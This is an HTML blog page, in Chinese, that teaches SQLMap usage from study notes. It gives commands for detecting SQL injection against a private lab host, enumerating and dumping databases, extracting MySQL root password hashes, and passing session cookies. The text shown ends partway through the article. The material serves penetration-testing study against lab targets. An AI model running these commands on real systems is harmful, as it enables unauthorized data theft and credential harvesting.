@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>SQLMap 使用指南 - swfk 的安全笔记</title>
+<meta name="description" content="SQLMap 从安装、探测到脱库的常用参数与实战用法，包括 tamper、级别调整与常见问题。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/sqlmap-usage-guide/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLMap 使用指南 - swfk 的安全笔记">
+<meta property="og:description" content="SQLMap 从安装、探测到脱库的常用参数与实战用法，包括 tamper、级别调整与常见问题。">
+<meta property="og:url" content="https://blogbu2154.site/sqlmap-usage-guide/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/7.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B8%AE%E5%8A%A9%E4%BF%A1%E6%81%AF"><span class="toc-text">查看帮助信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">使用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">1 检测 SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-text">2 获取基础信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93current-db-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">–current-db:获取当前数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93current-user-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-text">–current-user: 获取当前用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93banner-%E8%8E%B7%E5%8F%96mysql-%E7%89%88%E6%9C%AC"><span class="toc-text">–banner: 获取mysql 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93is-dba-%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E6%98%AF%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-text">–is-dba: 判断当前用户是否是管理员</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">3 获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93dbs-%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">–dbs : 获取所有的数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-text">4 获取表名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#D-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">-D : 获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93tables%EF%BC%9A%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-text">–tables：获取表名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-text">5 获取列名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#T-%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-text">-T : 指定数据库的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93columns-%EF%BC%9B%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-text">–columns ；获取列名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">6 获取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89-%E5%A4%9A%E4%B8%AA%E5%88%97%E5%90%8D%EF%BC%8C%E4%BB%A5%E9%80%97%E5%8F%B7%E5%88%86%E9%9A%94"><span class="toc-text">-C : 获取列名，如果有 多个列名，以逗号分隔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93dump-%EF%BC%9B%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">–dump ；获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BD%BF%E7%94%A8-C-%E6%8C%87%E5%AE%9A%E5%88%97%E5%90%8D%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="toc-text">也可以不使用 -C 指定列名，直接获取所有数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap-%E6%89%BE%E5%87%BAmysql-root-%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81hash"><span class="toc-text">使用sqlmap 找出mysql root 用户的密码hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag%E5%80%BC"><span class="toc-text">获取flag值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-text">常用选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B8%85%E9%99%A4%E7%BC%93%E5%AD%98"><span class="toc-text">1 清除缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93flush-session-%E6%B8%85%E9%99%A4sqlmap%E7%95%99%E4%B8%8B%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-text">–flush-session  清除sqlmap留下的缓存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8C%87%E5%AE%9A-POST-%E8%AF%B7%E6%B1%82%E4%BD%93"><span class="toc-text">2 指定 POST 请求体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93data-%E6%8C%87%E5%AE%9A%E8%AF%B7%E6%B1%82%E4%BD%93"><span class="toc-text">–data 指定请求体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%8C%87%E5%AE%9A%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87"><span class="toc-text">3 指定请求报文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#r-%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-text">-r 请求报文文件路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%BB%98%E8%AE%A4-%E6%97%A0%E4%BA%A4%E4%BA%92%E8%BF%90%E8%A1%8C"><span class="toc-text">4 默认 无交互运行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93batch-sqlmap-%E4%B8%8D%E5%86%8D%E8%AF%A2%E9%97%AE%EF%BC%8CY-n%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%BF%9D%E6%8C%81%E9%BB%98%E8%AE%A4%E8%BF%90%E8%A1%8C"><span class="toc-text">–batch   sqlmap 不再询问，Y&#x2F;n，直接保持默认运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">5 指定数据库的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93dbms-%E6%8C%87%E5%AE%9A"><span class="toc-text">–dbms 指定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%8C%87%E5%AE%9A-%E6%83%B3%E6%B5%8B%E8%AF%95%E7%9A%84-%E5%8F%82%E6%95%B0"><span class="toc-text">6 指定 想测试的 参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#p-%E5%8F%82%E6%95%B0%E5%90%8D"><span class="toc-text">-p  参数名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%8C%87%E5%AE%9A-cookie"><span class="toc-text">7 指定 cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93cookie"><span class="toc-text">–cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%8C%87%E5%AE%9A%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">8 指定利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93tech-%E5%BC%BA%E5%88%B6%E8%AE%A9-sqlmap-%E4%BD%BF%E7%94%A8%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">–tech 强制让 sqlmap  使用一种利用方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E6%98%BE%E7%A4%BA%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-text">9 显示攻击过程详细信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v"><span class="toc-text">-v</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%B5%8B%E8%AF%95%E7%AD%89%E7%BA%A7"><span class="toc-text">10  测试等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93level"><span class="toc-text">–level</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7"><span class="toc-text">11  风险等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93risk"><span class="toc-text">–risk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E9%9A%8F%E6%9C%BAUA"><span class="toc-text">12  随机UA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93random-agent"><span class="toc-text">–random-agent</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E4%BB%A3%E7%90%86"><span class="toc-text">13 代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93proxy"><span class="toc-text">–proxy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%80%89%E9%A1%B9"><span class="toc-text">其他选项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80-%E9%97%AD%E5%90%88"><span class="toc-text">1  指定前缀(闭合)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%93prefix"><span class="toc-text">–prefix</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80-%EF%BC%88%E6%B3%A8%E9%87%8A%EF%BC%89"><span class="toc-text">2  指定后缀 （注释）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%93suffix"><span class="toc-text">–suffix</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87waf"><span class="toc-text">3  绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%93tamper-%E8%84%9A%E6%9C%AC%E5%90%8D"><span class="toc-text">–tamper 脚本名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%9D%83%E9%99%90-getshell"><span class="toc-text">4  获取系统命令行权限 getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%93os-shell"><span class="toc-text">–os-shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%EF%BC%9A-sqlilabs"><span class="toc-text">靶场： sqlilabs</span></a></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>SQLMap 使用指南</h1>
+        <div class="post-meta">
+          <time datetime="2025-12-03">2025-12-03</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/7.jpg" alt="SQLMap 使用指南" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<pre><code class="hljs plain">git clone https://github.com/sqlmapproject/sqlmap.git
+python sqlmap.py</code></pre>
+
+<p> ⚠️ ：如果使用 kali 的自带的sqlmap ，则<strong>不需要</strong>输入 python sqlmap.py **直接输入 sqlmap 即可使用  **</p>
+<h2 id="查看帮助信息"><a href="#查看帮助信息" class="headerlink" title="查看帮助信息"></a>查看帮助信息</h2><pre><code class="hljs plain">python sqlmap.py -h  查看部分帮助信息
+python sqlmap.py -hh 查看全部帮助信息</code></pre>
+
+<h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><h2 id="1-检测-SQL-注入"><a href="#1-检测-SQL-注入" class="headerlink" title="1 检测 SQL 注入"></a>1 检测 SQL 注入</h2><pre><code class="hljs plain">python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+⚠：-u 是指 URL</code></pre>
+
+<h2 id="2-获取基础信息"><a href="#2-获取基础信息" class="headerlink" title="2 获取基础信息"></a>2 获取基础信息</h2><h3 id="–current-db-获取当前数据库"><a href="#–current-db-获取当前数据库" class="headerlink" title="–current-db:获取当前数据库"></a>–current-db:获取当前数据库</h3><pre><code class="hljs plain">--current-db:获取当前数据库
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --current-db</code></pre>
+
+<h3 id="–current-user-获取当前用户"><a href="#–current-user-获取当前用户" class="headerlink" title="–current-user: 获取当前用户"></a>–current-user: 获取当前用户</h3><pre><code class="hljs plain">--current-user: 获取当前用户
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --current-user</code></pre>
+
+<h3 id="–banner-获取mysql-版本"><a href="#–banner-获取mysql-版本" class="headerlink" title="–banner: 获取mysql 版本"></a>–banner: 获取mysql 版本</h3><pre><code class="hljs plain">--banner: 获取mysql 版本
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --banner</code></pre>
+
+<h3 id="–is-dba-判断当前用户是否是管理员"><a href="#–is-dba-判断当前用户是否是管理员" class="headerlink" title="–is-dba: 判断当前用户是否是管理员"></a>–is-dba: 判断当前用户是否是管理员</h3><pre><code class="hljs plain">--is-dba: 判断当前用户是否是管理员
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --is-dba</code></pre>
+
+<h2 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3 获取数据库名"></a>3 获取数据库名</h2><h3 id="–dbs-获取所有的数据库名"><a href="#–dbs-获取所有的数据库名" class="headerlink" title="–dbs : 获取所有的数据库名"></a>–dbs : 获取所有的数据库名</h3><pre><code class="hljs plain">--dbs : 获取所有的数据库名
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --dbs</code></pre>
+
+<h2 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4 获取表名"></a>4 获取表名</h2><p>python sqlmap.py -r 121.txt -D weibo -T flag –dump</p>
+<h3 id="D-获取数据库名"><a href="#D-获取数据库名" class="headerlink" title="-D : 获取数据库名"></a>-D : 获取数据库名</h3><h3 id="–tables：获取表名"><a href="#–tables：获取表名" class="headerlink" title="–tables：获取表名"></a>–tables：获取表名</h3><pre><code class="hljs plain">-D : 获取数据库名
+--tables：获取表名
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D school --tables
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D 数据库名 --tables</code></pre>
+
+<h2 id="5-获取列名"><a href="#5-获取列名" class="headerlink" title="5 获取列名"></a>5 获取列名</h2><h3 id="T-指定数据库的表名"><a href="#T-指定数据库的表名" class="headerlink" title="-T : 指定数据库的表名"></a>-T : 指定数据库的表名</h3><h3 id="–columns-；获取列名"><a href="#–columns-；获取列名" class="headerlink" title="–columns ；获取列名"></a>–columns ；获取列名</h3><pre><code class="hljs plain">-T : 指定数据库的表名
+--columns ；获取列名
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D school -T flag --columns
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D 数据库名 -T 表名 --columns</code></pre>
+
+<h2 id="6-获取数据"><a href="#6-获取数据" class="headerlink" title="6 获取数据"></a>6 获取数据</h2><h3 id="C-获取列名，如果有-多个列名，以逗号分隔"><a href="#C-获取列名，如果有-多个列名，以逗号分隔" class="headerlink" title="-C : 获取列名，如果有 多个列名，以逗号分隔"></a>-C : 获取列名，如果有 多个列名，以逗号分隔</h3><h3 id="–dump-；获取数据"><a href="#–dump-；获取数据" class="headerlink" title="–dump ；获取数据"></a>–dump ；获取数据</h3><pre><code class="hljs plain">-C : 获取列名，如果有 多个列名，以逗号分隔
+--dump ；获取数据
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D school -T students -C name,score --dump
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D 数据库 -T 表名 -C 列名1,列名2 --dump</code></pre>
+
+<h3 id="也可以不使用-C-指定列名，直接获取所有数据"><a href="#也可以不使用-C-指定列名，直接获取所有数据" class="headerlink" title="也可以不使用 -C 指定列名，直接获取所有数据"></a>也可以不使用 -C 指定列名，直接获取所有数据</h3><pre><code class="hljs plain">也可以不使用 -C 指定列名，直接获取所有数据
+
+ python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+ -D school -T students  --dump</code></pre>
+
+<h2 id="使用sqlmap-找出mysql-root-用户的密码hash"><a href="#使用sqlmap-找出mysql-root-用户的密码hash" class="headerlink" title="使用sqlmap 找出mysql root 用户的密码hash"></a>使用sqlmap 找出mysql root 用户的密码hash</h2><pre><code class="hljs plain">python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D mysql -T user --columns</code></pre>
+
+<pre><code class="hljs plain">python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D mysql -T user -C host,user,authentication_string --dump</code></pre>
+
+<h2 id="获取flag值"><a href="#获取flag值" class="headerlink" title="获取flag值"></a>获取flag值</h2><pre><code class="hljs plain">python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D school -T flag --dump</code></pre>
+
+<h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><h2 id="1-清除缓存"><a href="#1-清除缓存" class="headerlink" title="1 清除缓存"></a>1 清除缓存</h2><h3 id="–flush-session-清除sqlmap留下的缓存"><a href="#–flush-session-清除sqlmap留下的缓存" class="headerlink" title="–flush-session  清除sqlmap留下的缓存"></a>–flush-session  清除sqlmap留下的缓存</h3><pre><code class="hljs plain">--flush-session  清除sqlmap留下的缓存
+
+python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
+-D school -T flag --dump --flush-session</code></pre>
+
+<h2 id="2-指定-POST-请求体"><a href="#2-指定-POST-请求体" class="headerlink" title="2 指定 POST 请求体"></a>2 指定 POST 请求体</h2><h3 id="–data-指定请求体"><a href="#–data-指定请求体" class="headerlink" title="–data 指定请求体"></a>–data 指定请求体</h3><pre><code class="hljs plain">--data 指定请求体
+sqlmap -u http://192.168.79.120/boolean_sqli.php --data=&quot;student_id=20210101&quot;</code></pre>
+
+<h2 id="3-指定请求报文"><a href="#3-指定请求报文" class="headerlink" title="3 指定请求报文"></a>3 指定请求报文</h2><h3 id="r-请求报文文件路径"><a href="#r-请求报文文件路径" class="headerlink" title="-r 请求报文文件路径"></a>-r 请求报文文件路径</h3><pre><code class="hljs plain">-r 请求报文文件路径
+sqlmap -r /root/sql/1.txt</code></pre>
+
+<h2 id="4-默认-无交互运行"><a href="#4-默认-无交互运行" class="headerlink" title="4 默认 无交互运行"></a>4 默认 无交互运行</h2><h3 id="–batch-sqlmap-不再询问，Y-n，直接保持默认运行"><a href="#–batch-sqlmap-不再询问，Y-n，直接保持默认运行" class="headerlink" title="–batch   sqlmap 不再询问，Y&#x2F;n，直接保持默认运行"></a>–batch   sqlmap 不再询问，Y&#x2F;n，直接保持默认运行</h3><pre><code class="hljs plain">--batch   sqlmap 不再询问，Y/n，直接保持默认运行
+sqlmap -r /root/sql/1.txt --batch</code></pre>
+
+<h2 id="5-指定数据库的类型"><a href="#5-指定数据库的类型" class="headerlink" title="5 指定数据库的类型"></a>5 指定数据库的类型</h2><p>sqlmap 支持的 dbms 很多，不仅有 mysql, sqlmap 默认情况下会尝试dbms 是哪个，也可以是用</p>
+<h3 id="–dbms-指定"><a href="#–dbms-指定" class="headerlink" title="–dbms 指定"></a>–dbms 指定</h3><pre><code class="hljs plain">python sqlmap.py -r /home/yu/sqlmap/1.txt --dbms mysql</code></pre>
+
+<pre><code class="hljs plain">--dbms mysql
+--dbms mssql
+--dbms pgsql
+--dbms oracle
+--dbms access
+--dbms sqlite</code></pre>
+
+<pre><code class="hljs plain">python sqlmap.py -r /home/yu/sqlmap/1.txt --dbms oracle --batch</code></pre>
+
+<h2 id="6-指定-想测试的-参数"><a href="#6-指定-想测试的-参数" class="headerlink" title="6 指定 想测试的 参数"></a>6 指定 想测试的 参数</h2><h3 id="p-参数名"><a href="#p-参数名" class="headerlink" title="-p  参数名"></a>-p  参数名</h3><pre><code class="hljs plain">-p  参数名
+sqlmap -r /root/sql/1.txt -p student_id</code></pre>
+
+<h2 id="7-指定-cookie"><a href="#7-指定-cookie" class="headerlink" title="7 指定 cookie"></a>7 指定 cookie</h2><h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><pre><code class="hljs plain">--cookie</code></pre>
+
+<pre><code class="hljs plain">需要登录才能打的漏洞，称为后台漏洞
+不需要登录就能打的漏洞，称为前台漏洞
+如后台 SQL注入、前台SQL注入
+危害： 前台漏洞 &gt; 后台漏洞
+数量： 后台漏洞 &gt; 前台漏洞</code></pre>
+
+<pre><code class="hljs plain">python sqlmap.py -u &quot;http://192.168.79.120:81/vulnerabilities/sqli/?id=2&amp;Submit
+=Submit#&quot; --cookie =&quot;PHPSESSID=umnbn94se9v9b27li7fq7h9242; security=low&quot;
+</code></pre>
+
+<h2 id="8-指定利用方式"><a href="#8-指定利用方式" class="headerlink" title="8 指定利用方式"></a>8 指定利用方式</h2><h3 id="–tech-强制让-sqlmap-使用一种利用方式"><a href="#–tech-强制让-sqlmap-使用一种利用方式" class="headerlink" title="–tech 强制让 sqlmap  使用一种利用方式"></a>–tech 强制让 sqlmap  使用一种利用方式</h3><pre><code class="hljs plain">--tech B   布尔盲注
+--tech E   报错注入
+--tech U	 联合查询
+--tech S   堆叠注入
+--tech T	 时间盲注
+--tech Q	 内联查询</code></pre>
+
+<pre><code class="hljs plain">python sqlmap.py -u &quot;http://192.168.79.120:81/vulnerabilities/sqli_blind/?id=9
+&amp;Submit=Submit#&quot; --cookie =&quot;PHPSESSID=umnbn94se9v9b27li7fq7h9242;
+security=low&quot; --dbs --tech B</code></pre>
+
+<h2 id="9-显示攻击过程详细信息"><a href="#9-显示攻击过程详细信息" class="headerlink" title="9 显示攻击过程详细信息"></a>9 显示攻击过程详细信息</h2><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><pre><code class="hljs plain">-v
+-v 0	不显示信息，只显示结果
+-v 1	默认
+-v 2	显示调试信息
+-v 3	显示攻击过程</code></pre>
+
